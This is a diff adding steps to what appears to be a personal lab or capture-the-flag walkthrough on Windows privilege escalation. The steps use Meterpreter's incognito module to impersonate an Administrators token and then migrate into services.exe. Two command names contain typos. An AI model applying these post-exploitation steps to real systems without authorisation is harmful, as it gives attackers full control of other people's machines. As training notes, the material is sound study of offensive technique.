@@ -184,3 +184,31 @@ whoami /priv
 ![[Pasted image 20251014202749.png]]
 
 - We see that there are two privilege that are enabled whilst the others are disabled
+## Exploit the enabled privileges with incognito module
+1. use ***load incognito*** to load the incognito module in metasploit 
+![[Pasted image 20251014203040.png]]
+
+2. Check which tokens are available using ***list_token -g*** 
+![[Pasted image 20251014203242.png]]
+
+3. Impersonate the Administrator token using ***impersonate_token "BUILDIN\Administrators"***
+```
+impersonate_token "BUILDIN\Administrators"
+```
+![[Pasted image 20251014203424.png]]
+
+## Migrating to a process
+So even though you impersonate a token with higher privileges it does not mean that you will receive the permissioned, because of how Windows handles these tokens.
+- To bypass this, we will need to migrate to a process 
+- Safest one to migrate to is the ***services.exe*** process 
+
+1. Use the ***ps*** command to view the processes 
+![[Pasted image 20251014203802.png]]
+
+2. Find the ***services.exe*** process 
+3. Migrate to the process using ***migrate PID-of-Process*** 
+![[Pasted image 20251014203837.png]]
+
+## Read the root.txt file located at C:\Windows\System32\config
+
+`
